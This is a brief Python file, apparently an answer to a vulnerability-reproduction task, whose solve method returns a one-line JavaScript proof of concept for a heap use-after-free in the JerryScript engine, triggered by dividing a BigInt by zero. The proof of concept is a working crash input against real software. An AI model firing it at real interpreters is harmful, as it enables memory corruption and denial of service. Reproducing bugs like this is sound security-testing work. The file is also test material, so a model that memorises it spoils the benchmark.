import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability description matches JerryScript (CVE-2021-46342):
        # Heap-use-after-free in compound division by zero with BigInts.
        # PoC triggers the issue by performing compound division by zero on a BigInt.
        return b"var i = 1n; try { i /= 0n; } catch (e) {}"
